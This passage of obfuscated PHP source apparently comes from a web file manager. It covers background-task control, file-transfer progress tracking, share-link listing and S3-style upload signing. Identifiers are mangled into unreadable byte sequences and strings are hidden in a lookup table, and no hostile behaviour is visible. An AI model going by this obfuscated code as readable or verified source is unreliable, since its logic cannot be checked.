0.2; if (timeFloat() - $’Û”–Ô‹[$Ğ¾Ï£ÃÖ[1667]] < $ş¢ç¤¨í && !$“¼Šï°) { return; } $ó€¶ß‚ = self::get($’Û”–Ô‹[$Ğ¾Ï£ÃÖ[399]]); $şÀ÷Áì© = $ó€¶ß‚[$Ğ¾Ï£ÃÖ[760]]; if ($şÀ÷Áì© == self::STATYS_KILL) { $²‚ş‡« = array($Ğ¾Ï£ÃÖ[1678] => LNG($Ğ¾Ï£ÃÖ[1679]), $Ğ¾Ï£ÃÖ[1194] => !1); Cache::set($Ğ¾Ï£ÃÖ[1680] . $this->task[$Ğ¾Ï£ÃÖ[399]], $²‚ş‡«, 30); $this->onKill(); $this->end(); die; } else { if ($şÀ÷Áì© == self::STATYS_STOP) { $œˆİò¤÷ = 2; $ó€¶ß‚[$Ğ¾Ï£ÃÖ[1668]] += $œˆİò¤÷; self::valueSet($’Û”–Ô‹[$Ğ¾Ï£ÃÖ[399]], $ó€¶ß‚); sleep($œˆİò¤÷); $this->update(); return; } } $’Û”–Ô‹[$Ğ¾Ï£ÃÖ[760]] = $şÀ÷Áì© ? $şÀ÷Áì© : $’Û”–Ô‹[$Ğ¾Ï£ÃÖ[760]]; $’Û”–Ô‹[$Ğ¾Ï£ÃÖ[1668]] = $ó€¶ß‚[$Ğ¾Ï£ÃÖ[1668]] ? $ó€¶ß‚[$Ğ¾Ï£ÃÖ[1668]] : 0; $’Û”–Ô‹[$Ğ¾Ï£ÃÖ[1667]] = timeFloat(); Hook::trigger($Ğ¾Ï£ÃÖ[1681], $’Û”–Ô‹); self::valueSet($’Û”–Ô‹[$Ğ¾Ï£ÃÖ[399]], $’Û”–Ô‹); } public function onKillSet($«òÙ©í², $É£ŸÇë = array()) { $this->onKillCall = array($«òÙ©í², $É£ŸÇë); } public function onKill() { $°¢Ê“©¤ =& $_SERVER[ïëó©ÒÚ]; self::log($°¢Ê“©¤[1675] . $this->task[$°¢Ê“©¤[399]] . $°¢Ê“©¤[1682]); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); $this->onKillCall = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($ËÕ¹Ö ) { $–ó²©õ” =& $_SERVER[ïëó©ÒÚ]; Cache::set($–ó²©õ”[1680] . $this->task[$–ó²©õ”[399]], $ËÕ¹Ö , 60); return $ËÕ¹Ö ; } public static function get($‡ëøëĞ) { $³’ëÉ£Ó =& $_SERVER[ïëó©ÒÚ]; $ÇÈØ‰è = self::valueGet($‡ëøëĞ); if (is_array($ÇÈØ‰è) && $ÇÈØ‰è[$³’ëÉ£Ó[1683]]) { $»Ë¦å¹ = ActionApply($ÇÈØ‰è[$³’ëÉ£Ó[1683]], array($ÇÈØ‰è)); $ÇÈØ‰è = is_array($»Ë¦å¹) ? $»Ë¦å¹ : $ÇÈØ‰è; } return $ÇÈØ‰è; } public static function listData() { $™øÒƒè¶ = self::valueGet(); return array_sort_by($™øÒƒè¶, $_SERVER[ïëó©ÒÚ][1665], !0); } public static function kill($·õíş¿¯) { return self::changeStatus($·õíş¿¯, self::STATYS_KILL); } public static function stop($àóöÌ™) { return self::changeStatus($àóöÌ™, self::STATYS_STOP); } public static function restart($‘Ø»ôû·) { return self::changeStatus($‘Ø»ôû·, self::STATYS_RUNNING); } public static function killAll() { $Â¥°Ë¶ =& $_SERVER[ïëó©ÒÚ]; $–¡öœÊè = self::listData(); foreach ($–¡öœÊè as $õ€Š»µ) { self::kill($õ€Š»µ[$Â¥°Ë¶[399]]); } sleep(2); foreach ($–¡öœÊè as $õ€Š»µ) { self::valueSet($õ€Š»µ[$Â¥°Ë¶[399]], !1); } } private static function changeStatus($õö‰õØğ, $ñ‹¸ëş¹) { $Ò©ÖÜĞ¹ =& $_SERVER[ïëó©ÒÚ]; $ˆ«¶³â = self::valueGet($õö‰õØğ); if (!$ˆ«¶³â) { return !1; } $ˆ«¶³â[$Ò©ÖÜĞ¹[760]] = $ñ‹¸ëş¹; self::valueSet($õö‰õØğ, $ˆ«¶³â); self::log($Ò©ÖÜĞ¹[1684] . $ˆ«¶³â[$Ò©ÖÜĞ¹[399]] . $Ò©ÖÜĞ¹[1685] . $ñ‹¸ëş¹); return !0; } public static function valueGet($ªíÒ¡˜ = false) { $×™¼œúË =& $_SERVER[ïëó©ÒÚ]; if ($ªíÒ¡˜) { $‡ÀÃ°ô£ = Model($×™¼œúË[456])->where(array($×™¼œúË[94] => $ªíÒ¡˜, $×™¼œúË[33] => $×™¼œúË[1074]))->find(); return $‡ÀÃ°ô£ ? json_decode($‡ÀÃ°ô£[$×™¼œúË[374]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($à®úõ« = false) { $æíÊøş =& $_SERVER[ïëó©ÒÚ]; $‚Ù©Ï©İ = array($æíÊøş[33] => $æíÊøş[1074]); if ($à®úõ«) { $‚Ù©Ï©İ[$æíÊøş[1661]] = $à®úõ«; } $àÉúó‰ = Model($æíÊøş[456])->where($‚Ù©Ï©İ)->select(); $àÉúó‰ = $àÉúó‰ ? $àÉúó‰ : array(); foreach ($àÉúó‰ as $ø½Åşç¹ => $•«Ò´³ï) { $àÉúó‰[$ø½Åşç¹] = json_decode($•«Ò´³ï[$æíÊøş[374]], !0); } return $àÉúó‰; } public static function valueSet($¼í‹ü‰ê, $©Ğ…) { $ÚÅ“»ûÒ =& $_SERVER[ïëó©ÒÚ]; if (!$©Ğ…) { return Model($ÚÅ“»ûÒ[456])->where(array($ÚÅ“»ûÒ[94] => $¼í‹ü‰ê, $ÚÅ“»ûÒ[33] => $ÚÅ“»ûÒ[1074]))->delete(); } $¢Öá ·É = json_encode($©Ğ…); if (!$¢Öá ·É) { ob_start(); var_dump($©Ğ…); $˜Í¶ÎÉŸ = ob_get_clean(); self::log($ÚÅ“»ûÒ[1686] . json_encode_force($˜Í¶ÎÉŸ)); } if (!$¼í‹ü‰ê || !$©Ğ…[$ÚÅ“»ûÒ[399]]) { return !1; } $ÏÖÄëŸÍ = array($ÚÅ“»ûÒ[33] => $ÚÅ“»ûÒ[1074], $ÚÅ“»ûÒ[1661] => USER_ID, $ÚÅ“»ûÒ[94] => $¼í‹ü‰ê, $ÚÅ“»ûÒ[374] => $¢Öá ·É); $¶Ïëà‘ì = $ÚÅ“»ûÒ[1687]; CacheLock::lock($¶Ïëà‘ì); Model($ÚÅ“»ûÒ[456])->add($ÏÖÄëŸÍ, array(), !0); CacheLock::unlock($¶Ïëà‘ì); } public static function log($ºøêÑÇ) { if (!GLOBAL_DEBUG) { return; } write_log($ºøêÑÇ, $_SERVER[ïëó©ÒÚ][1688]); } } class TaskFileTransfer extends Task { protected function startAfter() { $ ®ğ‰¤û =& $_SERVER[ïëó©ÒÚ]; $Ò…ùîÍè =& $this->task; $this->sourceCopyFolder = !1; Hook::bind($ ®ğ‰¤û[1689], array($this, $ ®ğ‰¤û[1690])); Hook::bind($ ®ğ‰¤û[1218], array($this, $ ®ğ‰¤û[1691])); Hook::bind($ ®ğ‰¤û[1692], array($this, $ ®ğ‰¤û[1693])); Hook::bind($ ®ğ‰¤û[613], array($this, $ ®ğ‰¤û[1694])); Hook::bind($ ®ğ‰¤û[614], array($this, $ ®ğ‰¤û[1695])); Hook::bind($ ®ğ‰¤û[619], array($this, $ ®ğ‰¤û[1696])); Hook::bind($ ®ğ‰¤û[620], array($this, $ ®ğ‰¤û[1697])); Hook::bind($ ®ğ‰¤û[616], array($this, $ ®ğ‰¤û[1698])); Hook::bind($ ®ğ‰¤û[617], array($this, $ ®ğ‰¤û[1699])); Hook::bind($ ®ğ‰¤û[583], array($this, $ ®ğ‰¤û[1700])); Hook::bind($ ®ğ‰¤û[580], array($this, $ ®ğ‰¤û[1700])); Hook::bind($ ®ğ‰¤û[585], array($this, $ ®ğ‰¤û[1700])); Hook::bind($ ®ğ‰¤û[587], array($this, $ ®ğ‰¤û[1700])); Hook::bind($ ®ğ‰¤û[589], array($this, $ ®ğ‰¤û[1700])); Hook::bind($ ®ğ‰¤û[1701], array($this, $ ®ğ‰¤û[1702])); Hook::bind($ ®ğ‰¤û[606], array($this, $ ®ğ‰¤û[1703])); $this->sourceModelCopyFlag = !1; Hook::bind($ ®ğ‰¤û[1704], array($this, $ ®ğ‰¤û[1705])); Hook::bind($ ®ğ‰¤û[1706], array($this, $ ®ğ‰¤û[1707])); Hook::bind($ ®ğ‰¤û[1708], array($this, $ ®ğ‰¤û[1709])); $Ò…ùîÍè[$ ®ğ‰¤û[1710]] = LNG($ ®ğ‰¤û[1711]); $Ò…ùîÍè[$ ®ğ‰¤û[1712]] = 0; $Ò…ùîÍè[$ ®ğ‰¤û[1713]] = 0; $Ò…ùîÍè[$ ®ğ‰¤û[1067]] = $ ®ğ‰¤û[12]; $Ò…ùîÍè[$ ®ğ‰¤û[1714]] = $ ®ğ‰¤û[12]; $Ò…ùîÍè[$ ®ğ‰¤û[1715]] = 0; $Ò…ùîÍè[$ ®ğ‰¤û[1716]] = 0; $Ò…ùîÍè[$ ®ğ‰¤û[1717]] = 0; if (!$Ò…ùîÍè[$ ®ğ‰¤û[1560]]) { $Ò…ùîÍè[$ ®ğ‰¤û[1560]] = LNG($ ®ğ‰¤û[1718]); } } protected function endAfter() { $£Éèš°Ô =& $_SERVER[ïëó©ÒÚ]; Hook::unbind($£Éèš°Ô[1689], array($this, $£Éèš°Ô[1690])); Hook::unbind($£Éèš°Ô[1218], array($this, $£Éèš°Ô[1691])); Hook::unbind($£Éèš°Ô[1692], array($this, $£Éèš°Ô[1693])); Hook::unbind($£Éèš°Ô[613], array($this, $£Éèš°Ô[1694])); Hook::unbind($£Éèš°Ô[614], array($this, $£Éèš°Ô[1695])); Hook::unbind($£Éèš°Ô[619], array($this, $£Éèš°Ô[1696])); Hook::unbind($£Éèš°Ô[620], array($this, $£Éèš°Ô[1697])); Hook::unbind($£Éèš°Ô[616], array($this, $£Éèš°Ô[1698])); Hook::unbind($£Éèš°Ô[617], array($this, $£Éèš°Ô[1699])); Hook::unbind($£Éèš°Ô[583], array($this, $£Éèš°Ô[1700])); Hook::unbind($£Éèš°Ô[580], array($this, $£Éèš°Ô[1700])); Hook::unbind($£Éèš°Ô[585], array($this, $£Éèš°Ô[1700])); Hook::unbind($£Éèš°Ô[587], array($this, $£Éèš°Ô[1700])); Hook::unbind($£Éèš°Ô[589], array($this, $£Éèš°Ô[1700])); Hook::unbind($£Éèš°Ô[1701], array($this, $£Éèš°Ô[1702])); Hook::unbind($£Éèš°Ô[606], array($this, $£Éèš°Ô[1703])); Hook::unbind($£Éèš°Ô[1704], array($this, $£Éèš°Ô[1705])); Hook::unbind($£Éèš°Ô[1706], array($this, $£Éèš°Ô[1707])); Hook::unbind($£Éèš°Ô[1708], array($this, $£Éèš°Ô[1709])); } public function copyMoveStart($ëâ÷ô¹§, $–Ï®Øª´, $üéÑÈ¹’, $ø¡´Òù) { $ŠÓ‰ ¼ =& $_SERVER[ïëó©ÒÚ]; self::log($ŠÓ‰ ¼[1719] . $–Ï®Øª´ . $ŠÓ‰ ¼[70] . $ø¡´Òù); $Ë‹„½ = rtrim(TEMP_FILES, $ŠÓ‰ ¼[8]); if (substr($–Ï®Øª´, 0, strlen($Ë‹„½)) == $Ë‹„½) { return; } if (substr($ø¡´Òù, 0, strlen($Ë‹„½)) == $Ë‹„½) { return; } $Ø‹ÒİÊ– =& $this->task; $Ø‹ÒİÊ–[$ŠÓ‰ ¼[1720]] = KodIO::transferType($ëâ÷ô¹§, $üéÑÈ¹’); $this->update(); } public function updateAfter() { $¿ò¿ª• =& $_SERVER[ïëó©ÒÚ]; $Ùİ¹šã¢ =& $this->task; if (!$Ùİ¹šã¢[$¿ò¿ª•[773]]) { return; } if ($this->sourceModelCopyFlag) { return; } if ($Ùİ¹šã¢[$¿ò¿ª•[1720]] == $¿ò¿ª•[1307]) { return; } self::updateTask($Ùİ¹šã¢); } private static function updateTask(&$¦²æüš•) { $ğÅ¿şŒŞ =& $_SERVER[ïëó©ÒÚ]; if ($¦²æüš•[$ğÅ¿şŒŞ[1720]] == $ğÅ¿şŒŞ[1202] || $¦²æüš•[$ğÅ¿şŒŞ[1720]] == $ğÅ¿şŒŞ[107]) { if ($¦²æüš•[$ğÅ¿şŒŞ[1714]]) { $¦²æüš•[$ğÅ¿şŒŞ[1717]] = $¦²æüš•[$ğÅ¿şŒŞ[1716]] + $¦²æüš•[$ğÅ¿şŒŞ[1713]]; } } else { if ($¦²æüš•[$ğÅ¿şŒŞ[1720]] == $ğÅ¿şŒŞ[1308]) { if ($¦²æüš•[$ğÅ¿şŒŞ[1714]] == $ğÅ¿şŒŞ[1202]) { $¦²æüš•[$ğÅ¿şŒŞ[1717]] = $¦²æüš•[$ğÅ¿şŒŞ[1716]] + $¦²æüš•[$ğÅ¿şŒŞ[1713]] * 0.5; } else { if ($¦²æüš•[$ğÅ¿şŒŞ[1714]] == $ğÅ¿şŒŞ[107]) { $¦²æüš•[$ğÅ¿şŒŞ[1717]] = $¦²æüš•[$ğÅ¿şŒŞ[1716]] + $¦²æüš•[$ğÅ¿şŒŞ[1712]] * 0.5 + $¦²æüš•[$ğÅ¿şŒŞ[1713]] * 0.5; } } } } $¦²æüš•[$ğÅ¿şŒŞ[1663]] = $¦²æüš•[$ğÅ¿şŒŞ[1717]] / $¦²æüš•[$ğÅ¿şŒŞ[773]]; if ($¦²æüš•[$ğÅ¿şŒŞ[1663]] > 0) { $šé™¡œ± = timeFloat() - $¦²æüš•[$ğÅ¿şŒŞ[1665]] - $¦²æüš•[$ğÅ¿şŒŞ[1668]]; $¦²æüš•[$ğÅ¿şŒŞ[1669]] = $šé™¡œ± * (1 - $¦²æüš•[$ğÅ¿şŒŞ[1663]]) / $¦²æüš•[$ğÅ¿şŒŞ[1663]]; } } public function addPath($”áÔË´›) { $Ñªı¹¡û =& $_SERVER[ïëó©ÒÚ]; if (!$”áÔË´›) { return; } $İš£òÒÏ =& $this->task; $Ÿ ±şÑ¬ = IO::infoWithChildren($”áÔË´›); $ İÜÄ¯Ñ = $İš£òÒÏ[$Ñªı¹¡û[1721]] ? $İš£òÒÏ[$Ñªı¹¡û[1721]][$Ñªı¹¡û[1722]] : 0; $İš£òÒÏ[$Ñªı¹¡û[1721]] = array($Ñªı¹¡û[1722] => $ İÜÄ¯Ñ + 1, $Ñªı¹¡û[429] => $Ÿ ±şÑ¬[$Ñªı¹¡û[32]], $Ñªı¹¡û[84] => $Ÿ ±şÑ¬[$Ñªı¹¡û[84]], $Ñªı¹¡û[528] => $Ÿ ±şÑ¬[$Ñªı¹¡û[528]] ? $Ÿ ±şÑ¬[$Ñªı¹¡û[528]] : $Ÿ ±şÑ¬[$Ñªı¹¡û[84]]); if ($Ÿ ±şÑ¬[$Ñªı¹¡û[33]] == $Ñªı¹¡û[199]) { $İš£òÒÏ[$Ñªı¹¡û[796]] += 1; } else { $İš£òÒÏ[$Ñªı¹¡û[796]] += $Ÿ ±şÑ¬[$Ñªı¹¡û[79]][$Ñªı¹¡û[77]]; if ($Ÿ ±şÑ¬[$Ñªı¹¡û[411]]) { $İš£òÒÏ[$Ñªı¹¡û[796]] += $Ÿ ±şÑ¬[$Ñªı¹¡û[79]][$Ñªı¹¡û[78]] + 1; } } $İš£òÒÏ[$Ñªı¹¡û[773]] += $Ÿ ±şÑ¬[$Ñªı¹¡û[76]]; $this->update(); } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddHashStart($¡ŸİÓÊ€) { } public function sourceAddHashEnd($³ìâÎ¥€) { } public function sourceAddFileStart($ÌÓˆıéì) { $¤Ù’‡Æ† =& $_SERVER[ïëó©ÒÚ]; $ü›ùÕã =& $this->task; $ü›ùÕã[$¤Ù’‡Æ†[1712]] = $ÌÓˆıéì[$¤Ù’‡Æ†[76]]; $ü›ùÕã[$¤Ù’‡Æ†[1710]] = $ÌÓˆıéì[$¤Ù’‡Æ†[32]]; $ü›ùÕã[$¤Ù’‡Æ†[1067]] = $ÌÓˆıéì[$¤Ù’‡Æ†[32]]; $ü›ùÕã[$¤Ù’‡Æ†[1723]] = $ÌÓˆıéì[$¤Ù’‡Æ†[84]]; $this->update(); } public function sourceAddFileEnd($º–—É»ş) { $™š®‹şÒ =& $_SERVER[ïëó©ÒÚ]; $‹Üª¶‚™ =& $this->task; $‹Üª¶‚™[$™š®‹şÒ[1717]] += $º–—É»ş[$™š®‹şÒ[76]]; $‹Üª¶‚™[$™š®‹şÒ[1723]] = $º–—É»ş[$™š®‹şÒ[84]]; $this->update(1); } public function copyFileStart($ààõ€á‘, $ÀˆÎ•ì», $ßå‚ó·, $‹‰³Á¢ä, $Óìí¾Ñü, $ıÏãÕ”Ü) { $¨ËšşóÍ =& $_SERVER[ïëó©ÒÚ]; $€ƒ›áÉî = $Óìí¾Ñü; if ($€ƒ›áÉî == $GLOBALS[$¨ËšşóÍ[1724]]) { $€ƒ›áÉî = $GLOBALS[$¨ËšşóÍ[1725]]; } $GLOBALS[$¨ËšşóÍ[1725]] = $Óìí¾Ñü; $GLOBALS[$¨ËšşóÍ[1724]] = $ıÏãÕ”Ü; $ë¨Àò =& $this->task; $ë¨Àò[$¨ËšşóÍ[1710]] = $€ƒ›áÉî; $ë¨Àò[$¨ËšşóÍ[1712]] = (int) $ààõ€á‘->size($ÀˆÎ•ì»); $ë¨Àò[$¨ËšşóÍ[1713]] = 0; $ë¨Àò[$¨ËšşóÍ[1067]] = $¨ËšşóÍ[12]; $ë¨Àò[$¨ËšşóÍ[1714]] = $¨ËšşóÍ[12]; $ë¨Àò[$¨ËšşóÍ[1715]] = 0; $Î›‘şÀ = $ë¨Àò[$¨ËšşóÍ[1712]] > 1024 * 1024 * 10 ? !0 : !1; Cache::remove($ë¨Àò[$¨ËšşóÍ[399]] . $¨ËšşóÍ[1726]); if ($Î›‘şÀ && file_exists(get_path_father($‹‰³Á¢ä))) { Cache::set($ë¨Àò[$¨ËšşóÍ[399]] . $¨ËšşóÍ[1726], $‹‰³Á¢ä); $ë¨Àò[$¨ËšşóÍ[1683]] = array($¨ËšşóÍ[1727], $¨ËšşóÍ[1728]); } $this->update(0, $Î›‘şÀ); } public static function updateCopyLocalFileSize($ÜÔªõ ë) { $ÆÂ„¥ª =& $_SERVER[ïëó©ÒÚ]; $¦æÅª‘¯ = Cache::get($ÜÔªõ ë[$ÆÂ„¥ª[399]] . $ÆÂ„¥ª[1726]); if (!$¦æÅª‘¯ || !file_exists($¦æÅª‘¯)) { return $ÜÔªõ ë; } $ÜÔªõ ë[$ÆÂ„¥ª[1713]] = @filesize($¦æÅª‘¯); $ÜÔªõ ë[$ÆÂ„¥ª[1717]] += $ÜÔªõ ë[$ÆÂ„¥ª[1713]]; self::updateTask($ÜÔªõ ë); return $ÜÔªõ ë; } public function copyFileEnd($Ö”Ò²Üç, $¢Ãîó‹°, $¦ÓÈÓ²™, $Ñ³ÅåÑä, $÷Ó«¿, $Á›ÁÁ‹ç) { $Å¥äì¥³ =& $_SERVER[ïëó©ÒÚ]; $ìğ‚  =& $this->task; $ìğ‚ [$Å¥äì¥³[1713]] = $ìğ‚ [$Å¥äì¥³[1712]]; $ìğ‚ [$Å¥äì¥³[1714]] = $Å¥äì¥³[12]; unset($ìğ‚ [$Å¥äì¥³[1683]]); if ($÷Ó«¿ == $ìğ‚ [$Å¥äì¥³[1710]]) { $ìğ‚ [$Å¥äì¥³[1716]] += $ìğ‚ [$Å¥äì¥³[1712]]; $ìğ‚ [$Å¥äì¥³[1717]] = $ìğ‚ [$Å¥äì¥³[1716]]; $Ä¼š†µŸ = 1; if (isset($ìğ‚ [$Å¥äì¥³[1723]]) && $ìğ‚ [$Å¥äì¥³[1723]] == $¢Ãîó‹°) { $Ä¼š†µŸ = 0; } $this->update($Ä¼š†µŸ); } else { $this->update(); $ìğ‚ [$Å¥äì¥³[1713]] = 0; } Cache::remove($ìğ‚ [$Å¥äì¥³[399]] . $Å¥äì¥³[1726]); self::log($Å¥äì¥³[1729] . $¢Ãîó‹° . $Å¥äì¥³[70] . $Ñ³ÅåÑä . $Å¥äì¥³[231] . $÷Ó«¿ . $Å¥äì¥³[1730] . $ìğ‚ [$Å¥äì¥³[1710]]); } public function updateFileEnd($«†›ÎéÙ, $¿‚¬—”Û) { $Â¦·ú‹ =& $_SERVER[ïëó©ÒÚ]; $Èˆ¦í¸² =& $this->task; $Èˆ¦í¸²[$Â¦·ú‹[1710]] = $«†›ÎéÙ; $Èˆ¦í¸²[$Â¦·ú‹[1712]] = $¿‚¬—”Û; $Èˆ¦í¸²[$Â¦·ú‹[1716]] += $¿‚¬—”Û; $Èˆ¦í¸²[$Â¦·ú‹[1717]] = $Èˆ¦í¸²[$Â¦·ú‹[1716]]; $this->update(1); self::log($Â¦·ú‹[1731] . $«†›ÎéÙ); } public function sourceModelCopy($ƒßå”Û») { $ä¯ÍÛ¾ˆ =& $_SERVER[ïëó©ÒÚ]; $”ÛËò = $ƒßå”Û»[0]; $êŠ¢Êµâ = $ƒßå”Û»[1]; $Î×®ÇÅ– =& $this->task; $this->sourceModelCopyFlag = !0; $¥ÈªÊ†ö = 0; switch ($”ÛËò) { case $ä¯ÍÛ¾ˆ[581]: $¥ÈªÊ†ö = 1; break; case $ä¯ÍÛ¾ˆ[584]: $Î×®ÇÅ–[$ä¯ÍÛ¾ˆ[1710]] = $êŠ¢Êµâ[$ä¯ÍÛ¾ˆ[32]]; break; case $ä¯ÍÛ¾ˆ[586]: $¥ÈªÊ†ö = intval($ƒßå”Û»[$ä¯ÍÛ¾ˆ[380]] * 0.4); break; case $ä¯ÍÛ¾ˆ[588]: $¥ÈªÊ†ö = intval($ƒßå”Û»[$ä¯ÍÛ¾ˆ[380]] * 0.2); break; case $ä¯ÍÛ¾ˆ[590]: $¥ÈªÊ†ö = intval($ƒßå”Û»[$ä¯ÍÛ¾ˆ[380]] * 0.4); break; } $this->update($¥ÈªÊ†ö); $this->sourceModelCopyFlag = !1; } public function sourceRemove($º¯È´à, $ÑæÎ…¡) { $ï½‹±ªã =& $_SERVER[ïëó©ÒÚ]; $this->sourceModelCopyFlag = !0; $¸›¡è = 1; if (isset($º¯È´à[$ï½‹±ªã[79]])) { $¸›¡è = $º¯È´à[$ï½‹±ªã[79]][$ï½‹±ªã[77]]; $¸›¡è = $¸›¡è + $º¯È´à[$ï½‹±ªã[79]][$ï½‹±ªã[78]] + 1; } $this->update($¸›¡è); $this->sourceModelCopyFlag = !1; } public function sourceMove($ÓéœíÂç) { $this->sourceRemove($ÓéœíÂç, !1); } public function curlProgress($² €¼¶Ô, $ó İ“ß, $ñìú°À, $Õ¸ı±®œ, $ûãáÀ‹•) { $‚¸Œ×Ô =& $_SERVER[ïëó©ÒÚ]; $ŒÎè²ªí =& $this->task; if ($ûãáÀ‹• > 0) { $ŒÎè²ªí[$‚¸Œ×Ô[1067]] = $‚¸Œ×Ô[1732]; $ŒÎè²ªí[$‚¸Œ×Ô[1714]] = $‚¸Œ×Ô[107]; if ($ŒÎè²ªí[$‚¸Œ×Ô[1712]]) { $ŒÎè²ªí[$‚¸Œ×Ô[1713]] = $ûãáÀ‹•; } if ($ŒÎè²ªí[$‚¸Œ×Ô[1715]]) { $ŒÎè²ªí[$‚¸Œ×Ô[1713]] = $ûãáÀ‹• + $ŒÎè²ªí[$‚¸Œ×Ô[1715]]; } } else { if ($ñìú°À > 0) { if ($ŒÎè²ªí[$‚¸Œ×Ô[1712]] == $ó İ“ß) { $ŒÎè²ªí[$‚¸Œ×Ô[1713]] = $ñìú°À; $ŒÎè²ªí[$‚¸Œ×Ô[1067]] = $‚¸Œ×Ô[1733]; $ŒÎè²ªí[$‚¸Œ×Ô[1714]] = $‚¸Œ×Ô[1202]; } } } $this->update(); } public function curlProgressStart($£ş‘ÙÀš) { } public function curlProgressEnd($Şø€×÷÷) { $çé˜Ş‘— =& $_SERVER[ïëó©ÒÚ]; $—£¿—ªë =& $this->task; $â°ıİÅ´ = curl_getinfo($Şø€×÷÷); $æĞÃîÒ = $â°ıİÅ´[$çé˜Ş‘—[1734]]; if ($æĞÃîÒ == -1) { $æĞÃîÒ = $â°ıİÅ´[$çé˜Ş‘—[1735]]; } if ($—£¿—ªë[$çé˜Ş‘—[1714]] == $çé˜Ş‘—[107] && $æĞÃîÒ) { $—£¿—ªë[$çé˜Ş‘—[1715]] += $æĞÃîÒ; } $this->update(); } } goto a‘Û‚ƒôõù; eÑ ïÕ„Ÿë: class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($í›¬¸¹µ) { $this->pathParse = $í›¬¸¹µ; } protected function infoParse($®ÏÉãÄ², $Ÿê£ÈÑÒ = false) { $„×Æäåö =& $_SERVER[ïëó©ÒÚ]; return Action($„×Æäåö[1178])->sharePathInfo($this->pathParse[$„×Æäåö[84]], !0, $Ÿê£ÈÑÒ); } public function listPath($äü„£×˜, $¶—Æ‡éğ = false) { $è…Ó¾²í =& $_SERVER[ïëó©ÒÚ]; $Ï¥¬‚Âá = IO::listPath($äü„£×˜, $¶—Æ‡éğ); if (!$Ï¥¬‚Âá) { return $Ï¥¬‚Âá; } if (is_array($Ï¥¬‚Âá[$è…Ó¾²í[1339]])) { $ú·âôú = Action($è…Ó¾²í[1348])->parsePathChildren($Ï¥¬‚Âá[$è…Ó¾²í[1339]], array($è…Ó¾²í[430] => $äü„£×˜)); $Ï¥¬‚Âá[$è…Ó¾²í[1339]] = Action($è…Ó¾²í[1178])->shareItemInfo($ú·âôú); } foreach ($Ï¥¬‚Âá as $¯À¸…İµ => $ÇÁ¿ôªÏ) { if (!in_array($¯À¸…İµ, array($è…Ó¾²í[83], $è…Ó¾²í[82]))) { continue; } foreach ($ÇÁ¿ôªÏ as $ßÈñõ¨ => $ú·âôú) { $ú·âôú = Action($è…Ó¾²í[1348])->parsePathChildren($ú·âôú, array($è…Ó¾²í[430] => $äü„£×˜)); $Ï¥¬‚Âá[$¯À¸…İµ][$ßÈñõ¨] = Action($è…Ó¾²í[1178])->shareItemInfo($ú·âôú); } } return $Ï¥¬‚Âá; } public function listAll($Í×Ó‹Ô) { $½ç½öÛœ =& $_SERVER[ïëó©ÒÚ]; $ƒçêˆœÏ = IO::listAll($Í×Ó‹Ô); foreach ($ƒçêˆœÏ as &$Å¨ÏƒÏË) { $Éøï¬òÑ = IO::info($Å¨ÏƒÏË[$½ç½öÛœ[84]]); $Éøï¬òÑ = is_array($Éøï¬òÑ) ? $Éøï¬òÑ : array(); $Å¨ÏƒÏË = array_merge($Éøï¬òÑ, $Å¨ÏƒÏË); $Å¨ÏƒÏË[$½ç½öÛœ[86]] = Action($½ç½öÛœ[1178])->shareItemInfo($Å¨ÏƒÏË); } unset($Å¨ÏƒÏË); return $ƒçêˆœÏ; } } class PathDriverEDS extends PathDriverMinIO { public function __construct($ºü‘½Äø) { parent::__construct($ºü‘½Äø); } } class PathDriverEOS extends PathDriverBaseS3 { public function __construct($ÒÆ†Ú’Í) { parent::__construct($ÒÆ†Ú’Í); $this->signatureVersion($_SERVER[ïëó©ÒÚ][216]); } public function uploadFormData($ô¢¦”ˆØ, $àÚˆ¿„ = 3600) { $œªä¡¬» =& $_SERVER[ïëó©ÒÚ]; $ô¡òÌÂ = $œªä¡¬»[198]; $—ç†²„¸ = $œªä¡¬»[1349]; $°Ë¢È¢Ú = $œªä¡¬»[62]; $¿·©•º² = gmdate($œªä¡¬»[1350]); $¦Ò½¶œÚ = gmdate($œªä¡¬»[761]); $É¥ËÒ§Í = $œªä¡¬»[1351]; $ô¢‹¬‚Ú = $àÚˆ¿„ . $œªä¡¬»[12]; $³§ì£¦¦ = $œªä¡¬»[1313]; $Ã›êÕÃÒ = array($this->accessKey, $¦Ò½¶œÚ, $this->region, $°Ë¢È¢Ú, $É¥ËÒ§Í); $î¬Ğ¨Ûµ = implode($œªä¡¬»[8], $Ã›êÕÃÒ); $Ÿ†ëİÖ‰ = array($œªä¡¬»[1315] => gmdate($œªä¡¬»[1314], strtotime($œªä¡¬»[1352])), $œªä¡¬»[1316] => array(array($œªä¡¬»[1318] => $this->bucket), array($œªä¡¬»[1317] => $ô¡òÌÂ), array($œªä¡¬»[1319], $œªä¡¬»[1320], $œªä¡¬»[12]), array($œªä¡¬»[1319], $œªä¡¬»[1353], $œªä¡¬»[12]), array($œªä¡¬»[1319], $œªä¡¬»[1354], $œªä¡¬»[12]), array($œªä¡¬»[1321] => $³§ì£¦¦), array($œªä¡¬»[1355] => $î¬Ğ¨Ûµ), array($œªä¡¬»[1356] => $—ç†²„¸), array($œªä¡¬»[1357] => $¿·©•º²), array($œªä¡¬»[1358] => $ô¢‹¬‚Ú))); $Ê²ùøâ« = base64_encode(json_encode($Ÿ†ëİÖ‰)); $’¤ÆŞ Á = hash_hmac($œªä¡¬»[1359], $¦Ò½¶œÚ, $œªä¡¬»[1360] . $this->secret, !0); $‹¥œ›ÉÆ = hash_hmac($œªä¡¬»[1359], $this->region, $’¤ÆŞ Á, !0); $¿†ÎÔèß = hash_hmac($œªä¡¬»[1359], $°Ë¢È¢Ú, $‹¥œ›ÉÆ, !0); $‚³ü¶•¶ = hash_hmac($œªä¡¬»[1359], $É¥ËÒ§Í, $¿†ÎÔèß, !0); $ÍÓÄúÖì = hash_hmac($œªä¡¬»[1359], $Ê²ùøâ«, $‚³ü¶•¶); $¶Òı‰ş¯ = array($œªä¡¬»[215] => $œªä¡¬»[12], $œªä¡¬»[1361] => $œªä¡¬»[12], $œªä¡¬»[1317] => $ô¡òÌÂ, $œªä¡¬»[1321] => $³§ì£¦¦, $œªä¡¬»[1325] 